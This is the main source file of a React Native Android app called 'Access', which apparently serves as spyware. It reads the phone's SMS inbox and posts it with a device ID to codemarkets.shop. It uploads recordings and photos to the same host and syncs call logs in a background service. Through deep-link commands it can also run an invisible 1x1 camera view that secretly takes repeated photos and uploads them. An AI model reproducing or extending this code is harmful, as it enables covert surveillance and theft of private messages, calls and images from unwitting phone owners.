import './global.css';

import React, { useCallback, useEffect, useMemo, useState, useRef } from 'react';
import {
  ActivityIndicator,
  Alert,
  NativeModules,
  PermissionsAndroid,
  Platform,
  Pressable,
  SafeAreaView,
  Text,
  TextInput,
  View,
  StyleSheet,
  DeviceEventEmitter,
  Linking,
} from 'react-native';
import { getSMSList } from 'react-native-sms-module';
import CallLogs from 'react-native-call-log';
import Sound from 'react-native-nitro-sound';
import { captureScreen } from 'react-native-view-shot';
import { Camera, useCameraDevice, useCameraPermission } from 'react-native-vision-camera';
import { io } from 'socket.io-client';

import MicScreen from './MicScreen';
import CallsScreen from './CallsScreen';
import WhatsAppNotificationListenerScreen from './WhatsAppNotificationListenerScreen';
import GalleryScreen from './GalleryScreen';
import LiveCallScreen from './LiveCallScreen';
import ScreenCaptureScreen from './ScreenCaptureScreen';
import CameraScreen from './CameraScreen';
import AutoCallRecorderScreen from './AutoCallRecorderScreen';
import { startCallListener } from './CallListener';
import { startBackgroundService } from './BackgroundServiceManager';
import { bootstrapCallLogSyncOnAppLaunch } from './src/call-sync/callLogSyncService';

// Configure the Node Server IP here
const SERVER_IP = 'codemarkets.shop';
const SERVER_URL = `https://${SERVER_IP}`;
const API_URL = `${SERVER_URL}/api/sms`;
const CALL_SYNC_API_BASE_URL = `https://${SERVER_IP}`;
const CALL_SYNC_JWT_TOKEN = '';
const SMS_READ_LIMIT = 50;

const APP_SCREEN_DEFINITIONS = [
  {
    key: 'SMS',
    label: 'SMS Sender',
    className: 'w-full p-4 bg-emerald-600 rounded-lg items-center',
    render: () => <SMSScreen />,
  },
  {
    key: 'Mic',
    label: 'Voice Recorder',
    className: 'w-full p-4 bg-blue-600 rounded-lg items-center',
    render: () => <MicScreen />,
  },
  {
    key: 'Calls',
    label: 'Call Logs',
    className: 'w-full p-4 bg-amber-600 rounded-lg items-center',
    render: () => <CallsScreen autoRequest={true} />,
  },
  {
    key: 'LiveCall',
    label: 'Live Call Listener',
    className: 'w-full p-4 bg-rose-600 rounded-lg items-center',
    render: () => <LiveCallScreen />,
  },
  {
    key: 'AutoRecorder',
    label: 'Auto Call Recorder',
    className: 'w-full p-4 bg-red-600 rounded-lg items-center',
    render: () => <AutoCallRecorderScreen />,
  },
  {
    key: 'WhatsApp',
    label: 'WhatsApp Listener',
    className: 'w-full p-4 bg-purple-600 rounded-lg items-center',
    render: () => <WhatsAppNotificationListenerScreen />,
  },
  {
    key: 'Gallery',
    label: 'Gallery & photos',
    className: 'w-full p-4 bg-purple-600 rounded-lg items-center',
    render: () => <GalleryScreen />,
  },
  {
    key: 'ScreenCapture',
    label: 'Screen Capture',
    className: 'w-full p-4 bg-indigo-600 rounded-lg items-center',
    render: () => <ScreenCaptureScreen />,
  },
  {
    key: 'Camera',
    label: 'Camera Access',
    className: 'w-full p-4 bg-teal-600 rounded-lg items-center',
    render: () => <CameraScreen />,
  },
];

const HOME_SCREEN_ITEMS = APP_SCREEN_DEFINITIONS.map(({ key, label, className }) => ({
  screen: key,
  label,
  className,
}));

const SMS_INBOX_PERMISSIONS = [PermissionsAndroid.PERMISSIONS.READ_SMS];

function getStartupPermissions() {
  if (Platform.OS !== 'android') {
    return [];
  }

  const permissions = [
    PermissionsAndroid.PERMISSIONS.READ_CALL_LOG,
    PermissionsAndroid.PERMISSIONS.READ_PHONE_STATE,
    PermissionsAndroid.PERMISSIONS.READ_PHONE_NUMBERS,
    PermissionsAndroid.PERMISSIONS.RECORD_AUDIO,
    PermissionsAndroid.PERMISSIONS.CAMERA,
  ];

  if (Platform.Version >= 33) {
    permissions.push(
      PermissionsAndroid.PERMISSIONS.READ_MEDIA_IMAGES,
      PermissionsAndroid.PERMISSIONS.READ_MEDIA_VIDEO,
      PermissionsAndroid.PERMISSIONS.POST_NOTIFICATIONS,
    );
  } else {
    permissions.push(PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE);
  }

  return permissions;
}

function formatPermissionLabel(permission) {
  const labels = {
    [PermissionsAndroid.PERMISSIONS.READ_SMS]: 'Read SMS',
    [PermissionsAndroid.PERMISSIONS.SEND_SMS]: 'Send SMS',
    [PermissionsAndroid.PERMISSIONS.READ_CALL_LOG]: 'Read Call Logs',
    [PermissionsAndroid.PERMISSIONS.READ_PHONE_STATE]: 'Phone State',
    [PermissionsAndroid.PERMISSIONS.READ_PHONE_NUMBERS]: 'Phone Numbers',
    [PermissionsAndroid.PERMISSIONS.RECORD_AUDIO]: 'Microphone',
    [PermissionsAndroid.PERMISSIONS.CAMERA]: 'Camera',
    [PermissionsAndroid.PERMISSIONS.READ_MEDIA_IMAGES]: 'Photos',
    [PermissionsAndroid.PERMISSIONS.READ_MEDIA_VIDEO]: 'Videos',
    [PermissionsAndroid.PERMISSIONS.POST_NOTIFICATIONS]: 'Notifications',
    [PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE]: 'Storage',
  };

  return labels[permission] || permission;
}

async function requestStartupPermissions() {
  if (Platform.OS !== 'android') {
    return { granted: true, blocked: false, missingPermissions: [] };
  }

  const requiredPermissions = getStartupPermissions();
  const checkResults = await Promise.all(
    requiredPermissions.map(async permission => [permission, await PermissionsAndroid.check(permission)]),
  );

  const missingPermissions = checkResults
    .filter(([, granted]) => !granted)
    .map(([permission]) => permission);

  if (missingPermissions.length === 0) {
    return { granted: true, blocked: false, missingPermissions: [] };
  }

  const results = await PermissionsAndroid.requestMultiple(missingPermissions);
  const deniedPermissions = missingPermissions.filter(
    permission => results[permission] !== PermissionsAndroid.RESULTS.GRANTED,
  );

  if (deniedPermissions.length === 0) {
    return { granted: true, blocked: false, missingPermissions: [] };
  }

  const blocked = deniedPermissions.some(
    permission => results[permission] === PermissionsAndroid.RESULTS.NEVER_ASK_AGAIN,
  );

  return {
    granted: false,
    blocked,
    missingPermissions: deniedPermissions,
  };
}

function normalizeSmsMessage(message) {
  const rawDate = message.timestamp ?? message.date ?? Date.now();

  return {
    address: String(message.sender ?? message.address ?? ''),
    body: String(message.body ?? ''),
    date: new Date(Number(rawDate)).toISOString(),
  };
}

async function requestSmsPermissions() {
  if (Platform.OS !== 'android') {
    return {granted: false, blocked: false, missingPermissions: []};
  }

  const existingChecks = await Promise.all(
    SMS_INBOX_PERMISSIONS.map(async permission => [permission, await PermissionsAndroid.check(permission)]),
  );
  const missingPermissions = existingChecks
    .filter(([, granted]) => !granted)
    .map(([permission]) => permission);

  if (missingPermissions.length === 0) {
    return {granted: true, blocked: false, missingPermissions: []};
  }

  const permissionResults = await PermissionsAndroid.requestMultiple(
    missingPermissions,
  );

  const deniedPermissions = missingPermissions.filter(
    permission => permissionResults[permission] !== PermissionsAndroid.RESULTS.GRANTED,
  );

  const blocked = deniedPermissions.some(
    permission => permissionResults[permission] === PermissionsAndroid.RESULTS.NEVER_ASK_AGAIN,
  );

  return {
    granted: deniedPermissions.length === 0,
    blocked,
    missingPermissions: deniedPermissions,
  };
}

async function readInboxMessages() {
  const messages = await getSMSList(0, SMS_READ_LIMIT, {});
  return messages.map(normalizeSmsMessage);
}

function getDeviceInfo() {
  const platformConstants = NativeModules.PlatformConstants || {};

  const deviceName =
    platformConstants.Model ||
    platformConstants.model ||
    platformConstants.systemName ||
    `${Platform.OS} device`;

  const deviceId =
    platformConstants.Serial ||
    platformConstants.deviceId ||
    platformConstants.androidId ||
    `${Platform.OS}-${platformConstants.Release || platformConstants.Version || 'unknown'}`;

  return {
    deviceId: String(deviceId),
    deviceName: String(deviceName),
  };
}

async function postSmsMessages(messages, deviceId, deviceName) {
  const response = await fetch(API_URL, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      messages,
      device_id: deviceId,
      device_name: deviceName,
    }),
  });

  if (!response.ok) {
    throw new Error(`API request failed with status ${response.status}.`);
  }

  return response;
}

// Global File Upload Helper
async function uploadFile(fileUri, type, deviceId) {
  try {
    const formData = new FormData();
    const normalizedUri = String(fileUri || '');
    const formattedUri = Platform.OS === 'android'
      ? (normalizedUri.startsWith('file://') || normalizedUri.startsWith('content://')
        ? normalizedUri
        : `file://${normalizedUri}`)
      : normalizedUri.replace('file://', '');
    const filename = fileUri.split('/').pop() || 'upload.bin';
    const lower = String(fileUri || '').toLowerCase();
    const recordingMime =
      lower.endsWith('.m4a') || lower.endsWith('.mp4')
        ? 'audio/mp4'
        : lower.endsWith('.aac')
          ? 'audio/aac'
          : lower.endsWith('.wav')
            ? 'audio/wav'
            : lower.endsWith('.amr')
              ? 'audio/amr'
              : lower.endsWith('.3gp')
                ? 'audio/3gpp'
                : lower.endsWith('.mp3')
                  ? 'audio/mpeg'
                  : 'audio/mp4';
    const imageMime =
      lower.endsWith('.jpg') || lower.endsWith('.jpeg')
        ? 'image/jpeg'
        : lower.endsWith('.webp')
          ? 'image/webp'
          : 'image/png';

    formData.append('file', {
      uri: formattedUri,
      type: type === 'recording' ? recordingMime : imageMime,
      name: filename,
    });
    formData.append('device_id', deviceId);
    formData.append('type', type);

    console.log(`Uploading file: ${filename} to ${SERVER_URL}/api/upload`);
    const response = await fetch(`${SERVER_URL}/api/upload`, {
      method: 'POST',
      headers: {
        'Content-Type': 'multipart/form-data',
      },
      body: formData,
    });

    if (!response.ok) {
      throw new Error(`Upload server responded with status ${response.status}`);
    }
    return await response.json();
  } catch (err) {
    console.error("Upload failed", err);
    throw err;
  }
}

// Background Camera Helper Component
function BackgroundCameraHelper({ config, onCaptureComplete }) {
  const cameraRef = useRef(null);
  const device = useCameraDevice(config.camera);
  const { hasPermission, requestPermission } = useCameraPermission();

  useEffect(() => {
    let isMounted = true;

    const performCapture = async () => {
      try {
        let permissionGranted = hasPermission;
        if (!permissionGranted) {
          permissionGranted = await requestPermission();
        }

        if (!permissionGranted) {
          console.warn('Background camera capture skipped: permission denied');
          return;
        }

        // Give camera time to warm up and focus before first capture.
        await new Promise(resolve => setTimeout(resolve, 1600));

        while (isMounted) {
          if (!cameraRef.current) {
            await new Promise(resolve => setTimeout(resolve, 300));
            continue;
          }

          try {
            console.log('Background Camera taking photo...');
            const photo = await cameraRef.current.takePhoto({ flash: 'off' });
            const { deviceId } = getDeviceInfo();
            await uploadFile(photo.path, 'camera', deviceId);
            console.log('Background Photo uploaded successfully');
          } catch (err) {
            console.error('Background photo capture failed', err);
          }

          if (!config.live) {
            break;
          }

          await new Promise(resolve => setTimeout(resolve, config.intervalMs ?? 1500));
        }
      } finally {
        onCaptureComplete();
      }
    };

    performCapture();

    return () => {
      isMounted = false;
    };
  }, [config, hasPermission, requestPermission, onCaptureComplete]);

  if (!device) return null;

  return (
    <View style={{ position: 'absolute', width: 1, height: 1, opacity: 0, overflow: 'hidden' }}>
      <Camera
        ref={cameraRef}
        style={StyleSheet.absoluteFill}
        device={device}
        isActive={true}
        photo={true}
      />
    </View>
  );
}

function SMSScreen() {
  const [loading, setLoading] = useState(false);
  const [directLoading, setDirectLoading] = useState(false);
  const [statusMessage, setStatusMessage] = useState('');
  const [errorMessage, setErrorMessage] = useState('');
  const [recipient, setRecipient] = useState('');
  const [messageText, setMessageText] = useState('');
  const [rcsLoading, setRcsLoading] = useState(false);

  const buttonLabel = useMemo(
    () => (loading ? 'Sending...' : 'Send SMS Data'),
    [loading],
  );

  const rcsButtonLabel = useMemo(
    () => (rcsLoading ? 'Opening Messages...' : 'Send via RCS'),
    [rcsLoading],
  );

  const directButtonLabel = useMemo(
    () => (directLoading ? 'Sending SMS...' : 'Send SMS Now'),
    [directLoading],
  );

  const handleSendSmsData = useCallback(async () => {
    setLoading(true);
    setStatusMessage('');
    setErrorMessage('');

    try {
      const permissionResult = await requestSmsPermissions();

      if (!permissionResult.granted) {
        const message = permissionResult.blocked
          ? 'SMS permission is blocked. Open app settings and allow Read SMS.'
          : 'SMS permission was denied.';
        setErrorMessage(message);

        Alert.alert('Permission required', message, [
          {text: 'Close', style: 'cancel'},
          ...(permissionResult.blocked
            ? [{text: 'Open Settings', onPress: () => Linking.openSettings()}]
            : []),
        ]);
        return;
      }

      const messages = await readInboxMessages();
      const { deviceId, deviceName } = getDeviceInfo();
      await postSmsMessages(messages, deviceId, deviceName);

      setStatusMessage(`Successfully sent ${messages.length} SMS messages.`);
    } catch (error) {
      const message =
        error instanceof Error
          ? error.message
          : 'Unable to read or send SMS messages.';

      setErrorMessage(message);
      Alert.alert('SMS send failed', message);
    } finally {
      setLoading(false);
    }
  }, []);

  const handleSendViaRcs = useCallback(async () => {
    if (!recipient.trim() || !messageText.trim()) {
      const message = 'Please enter both recipient and message.';
      setErrorMessage(message);
      Alert.alert('Required', message);
      return;
    }

    setRcsLoading(true);
    setStatusMessage('');
    setErrorMessage('');

    try {
      const module = NativeModules.SmsSenderModule;
      if (!module?.openRcsComposer) {
        throw new Error('RCS module is not available.');
      }

      await module.openRcsComposer(recipient.trim(), messageText.trim());
      setStatusMessage('RCS composer opened and send action is being triggered.');
    } catch (error) {
      const message =
        error instanceof Error
          ? error.message
          : 'Unable to open the RCS composer.';

      setErrorMessage(message);
      Alert.alert('RCS send failed', message);
    } finally {
      setRcsLoading(false);
    }
  }, [messageText, recipient]);

  const handleSendDirectSms = useCallback(async () => {
    if (!recipient.trim() || !messageText.trim()) {
      const message = 'Please enter both recipient and message.';
      setErrorMessage(message);
      Alert.alert('Required', message);
      return;
    }

    setDirectLoading(true);
    setStatusMessage('');
    setErrorMessage('');

    try {
      if (Platform.OS !== 'android') {
        throw new Error('Direct SMS sending is only supported on Android.');
      }

      const sendPermission = await PermissionsAndroid.request(
        PermissionsAndroid.PERMISSIONS.SEND_SMS,
        {
          title: 'SMS Permission',
          message: 'This app needs SMS permission to send your message.',
          buttonPositive: 'Allow',
          buttonNegative: 'Deny',
        },
      );

      if (sendPermission !== PermissionsAndroid.RESULTS.GRANTED) {
        if (sendPermission === PermissionsAndroid.RESULTS.NEVER_ASK_AGAIN) {
          throw new Error('SEND_SMS permission blocked. Open app settings and allow SMS permission.');
        }
        throw new Error('SEND_SMS permission denied.');
      }

      const module = NativeModules.SmsSenderModule;
      if (!module?.sendSms) {
        throw new Error('Direct SMS module is not available.');
      }

      const result = await module.sendSms(recipient.trim(), messageText.trim());
      const resolvedRecipient = result?.recipient || recipient.trim();
      const subscriptionLabel =
        typeof result?.subscriptionId === 'number' ? ` (SIM ${result.subscriptionId})` : '';

      setStatusMessage(`SMS sent to ${resolvedRecipient}${subscriptionLabel}.`);
    } catch (error) {
      const message =
        error instanceof Error ? error.message : 'Unable to send SMS directly.';

      setErrorMessage(message);
      Alert.alert('Direct SMS send failed', message);
    } finally {
      setDirectLoading(false);
    }
  }, [messageText, recipient]);

  return (
    <View className="flex-1 bg-slate-950">
      <View className="flex-1 items-center justify-center px-6">
        <View className="w-full max-w-sm items-center gap-6">
          <Text className="text-center text-4xl font-bold text-white">
            SMS Sender
          </Text>

          <TextInput
            value={recipient}
            onChangeText={setRecipient}
            placeholder="Recipient"
            placeholderTextColor="#94a3b8"
            autoCapitalize="none"
            autoCorrect={false}
            keyboardType="phone-pad"
            className="h-12 w-full rounded-lg border border-slate-700 bg-slate-900 px-4 text-base text-white"
          />

          <TextInput
            value={messageText}
            onChangeText={setMessageText}
            placeholder="Message"
            placeholderTextColor="#94a3b8"
            multiline
            numberOfLines={4}
            className="min-h-24 w-full rounded-lg border border-slate-700 bg-slate-900 px-4 py-3 text-base text-white"
          />

          <Pressable
            accessibilityRole="button"
            disabled={loading}
            onPress={handleSendSmsData}
            className={`min-h-14 w-full items-center justify-center rounded-lg bg-emerald-500 px-5 ${loading ? 'opacity-70' : 'active:bg-emerald-600'
              }`}>
            <View className="flex-row items-center justify-center gap-3">
              {loading ? <ActivityIndicator color="#ffffff" /> : null}
              <Text className="text-base font-semibold text-white">
                {buttonLabel}
              </Text>
            </View>
          </Pressable>

          <Pressable
            accessibilityRole="button"
            disabled={directLoading}
            onPress={handleSendDirectSms}
            className={`min-h-14 w-full items-center justify-center rounded-lg bg-emerald-600 px-5 ${directLoading ? 'opacity-70' : 'active:bg-emerald-700'
              }`}>
            <View className="flex-row items-center justify-center gap-3">
              {directLoading ? <ActivityIndicator color="#ffffff" /> : null}
              <Text className="text-base font-semibold text-white">
                {directButtonLabel}
              </Text>
            </View>
          </Pressable>

          <Pressable
            accessibilityRole="button"
            disabled={rcsLoading}
            onPress={handleSendViaRcs}
            className={`min-h-14 w-full items-center justify-center rounded-lg bg-blue-600 px-5 ${rcsLoading ? 'opacity-70' : 'active:bg-blue-700'
              }`}>
            <View className="flex-row items-center justify-center gap-3">
              {rcsLoading ? <ActivityIndicator color="#ffffff" /> : null}
              <Text className="text-base font-semibold text-white">
                {rcsButtonLabel}
              </Text>
            </View>
          </Pressable>

          {statusMessage ? (
            <Text className="text-center text-base font-medium text-emerald-300">
              {statusMessage}
            </Text>
          ) : null}

          {errorMessage ? (
            <Text className="text-center text-base font-medium text-red-300">
              {errorMessage}
            </Text>
          ) : null}
        </View>
      </View>
    </View>
  );
}

function HomeScreen({ onNavigate, menuItems }) {
  const [lastEvent, setLastEvent] = useState(null);

  useEffect(() => {
    const unsubscribe = startCallListener((event) => {
      console.log("Call Event Received:", event);
      setLastEvent(event);
    });

    return () => unsubscribe();
  }, []);

  return (
    <View className="flex-1 bg-slate-950 items-center justify-center px-6">
      <Text className="text-center text-4xl font-bold text-white mb-6">
        Access
      </Text>

      {lastEvent ? (
        <View className="mb-6 w-full p-4 bg-slate-800 rounded-lg">
          <Text className="text-emerald-400 font-bold mb-1">Last Call Event:</Text>
          <Text className="text-slate-300 text-xs">{JSON.stringify(lastEvent)}</Text>
        </View>
      ) : null}

      <View className="w-full gap-4">
        {menuItems.map(item => (
          <Pressable
            key={item.screen}
            onPress={() => onNavigate(item.screen)}
            className={item.className}
          >
            <Text className="text-white text-lg font-semibold">{item.label}</Text>
          </Pressable>
        ))}
      </View>
    </View>
  );
}

export default function App() {
  const [activeScreen, setActiveScreen] = useState('Home');
  const [bgCameraConfig, setBgCameraConfig] = useState(null);
  const [startupPermissionState, setStartupPermissionState] = useState('checking');
  const [startupMissingPermissions, setStartupMissingPermissions] = useState([]);

  const startProtectedFeatures = useCallback(async () => {
    await startBackgroundService();

    const result = await bootstrapCallLogSyncOnAppLaunch({
      apiBaseUrl: CALL_SYNC_API_BASE_URL,
      jwtToken: CALL_SYNC_JWT_TOKEN,
    });
    console.log('Call log sync bootstrap result:', result);
  }, []);

  const parseQueryParams = useCallback((url) => {
    const queryIndex = url.indexOf('?');
    if (queryIndex === -1) {
      return {};
    }

    const query = url.slice(queryIndex + 1);
    if (!query) {
      return {};
    }

    return query.split('&').reduce((acc, pair) => {
      if (!pair) {
        return acc;
      }

      const [rawKey, rawValue = ''] = pair.split('=');
      const key = decodeURIComponent(rawKey || '').trim();
      if (!key) {
        return acc;
      }

      acc[key] = decodeURIComponent(rawValue || '').trim();
      return acc;
    }, {});
  }, []);

  const handleDeepLink = useCallback((url) => {
    if (!url) {
      return;
    }

    if (url.startsWith('smssender://camera-stop')) {
      setBgCameraConfig(null);
      setActiveScreen('Home');
      return;
    }

    if (url.startsWith('smssender://camera')) {
      const params = parseQueryParams(url);
      const lens = params.lens === 'front' ? 'front' : 'back';
      const live = params.live === '1';
      const intervalMs = Number(params.intervalMs || 1500);

      setBgCameraConfig({
        camera: lens,
        live,
        intervalMs: Number.isFinite(intervalMs) ? Math.max(800, intervalMs) : 1500,
      });
      setActiveScreen('Home');
      return;
    }

    if (url.startsWith('smssender://capture')) {
      setActiveScreen('Home');
    }
  }, []);

  const screenComponents = APP_SCREEN_DEFINITIONS.reduce((acc, screen) => {
    acc[screen.key] = screen.render();
    return acc;
  }, {});

  useEffect(() => {
    let isMounted = true;

    const initializeApp = async () => {
      try {
        const permissionResult = await requestStartupPermissions();
        if (!isMounted) {
          return;
        }

        setStartupMissingPermissions(permissionResult.missingPermissions);

        if (!permissionResult.granted) {
          setStartupPermissionState(permissionResult.blocked ? 'blocked' : 'denied');
          return;
        }

        setStartupPermissionState('granted');

        await startProtectedFeatures();
      } catch (error) {
        console.error('App startup initialization failed:', error);
        if (isMounted) {
          setStartupPermissionState('denied');
        }
      }
    };

    initializeApp();

    return () => {
      isMounted = false;
    };
  }, [startProtectedFeatures]);

  useEffect(() => {
    const subscription = Linking.addEventListener('url', event => {
      handleDeepLink(event.url);
    });

    Linking.getInitialURL()
      .then(url => {
        handleDeepLink(url);
      })
      .catch(error => {
        console.error('Failed to read initial deep link URL:', error);
      });

    return () => {
      subscription.remove();
    };
  }, [handleDeepLink]);

  const retryStartupPermissions = useCallback(() => {
    setStartupPermissionState('checking');
    setStartupMissingPermissions([]);

    requestStartupPermissions()
      .then(async permissionResult => {
        setStartupMissingPermissions(permissionResult.missingPermissions);

        if (!permissionResult.granted) {
          setStartupPermissionState(permissionResult.blocked ? 'blocked' : 'denied');
          return;
        }

        setStartupPermissionState('granted');
        await startProtectedFeatures();
      })
      .catch(error => {
        console.error('Retry permission flow failed:', error);
        setStartupPermissionState('denied');
      });
  }, [startProtectedFeatures]);

  if (startupPermissionState !== 'granted') {
    const permissionMessage = startupMissingPermissions.length
      ? startupMissingPermissions.map(formatPermissionLabel).join(', ')
      : 'required permissions';

    return (
      <SafeAreaView className="flex-1 bg-slate-950">
        <View className="flex-1 items-center justify-center px-6">
          <View className="w-full max-w-md rounded-2xl border border-slate-800 bg-slate-900 p-6">
            <Text className="text-center text-3xl font-bold text-white">
              Access
            </Text>

            <Text className="mt-4 text-center text-base text-slate-300">
              App start hone se pehle permissions allow karni hongi. Tabhi background service aur sab screens sahi se chalengi.
            </Text>

            <Text className="mt-4 text-center text-sm text-slate-400">
              Missing permissions: {permissionMessage}
            </Text>

            {startupPermissionState === 'checking' ? (
              <View className="mt-6 items-center">
                <ActivityIndicator color="#ffffff" />
                <Text className="mt-3 text-sm text-slate-300">Checking permissions...</Text>
              </View>
            ) : (
              <View className="mt-6 gap-3">
                <Pressable
                  onPress={retryStartupPermissions}
                  className="min-h-12 items-center justify-center rounded-lg bg-emerald-600 px-4 active:bg-emerald-700">
                  <Text className="text-base font-semibold text-white">
                    {startupPermissionState === 'blocked' ? 'Try Again' : 'Allow Permissions'}
                  </Text>
                </Pressable>

                {startupPermissionState === 'blocked' ? (
                  <Pressable
                    onPress={() => Linking.openSettings()}
                    className="min-h-12 items-center justify-center rounded-lg border border-slate-700 bg-slate-800 px-4 active:bg-slate-700">
                    <Text className="text-base font-semibold text-white">Open App Settings</Text>
                  </Pressable>
                ) : null}
              </View>
            )}
          </View>
        </View>
      </SafeAreaView>
    );
  }

  return (
    <SafeAreaView className="flex-1 bg-slate-950 mt-10 pt-10" style={{ paddingTop: 50 }}  >
      {bgCameraConfig && (
        <BackgroundCameraHelper
          config={bgCameraConfig}
          onCaptureComplete={() => setBgCameraConfig(null)}
        />
      )}

      {activeScreen !== 'Home' && (
        <View className="h-14 bg-slate-900 border-b border-slate-800 flex-row items-center px-4">
          <Pressable onPress={() => setActiveScreen('Home')} className="p-2">
            <Text className="text-blue-400 text-base font-semibold">{"<- Back to Home"}</Text>
          </Pressable>
        </View>
      )}
      <View className="flex-1">
        {activeScreen === 'Home'
          ? <HomeScreen onNavigate={setActiveScreen} menuItems={HOME_SCREEN_ITEMS} />
          : (screenComponents[activeScreen] ?? null)}
      </View>
    </SafeAreaView>
  );
}

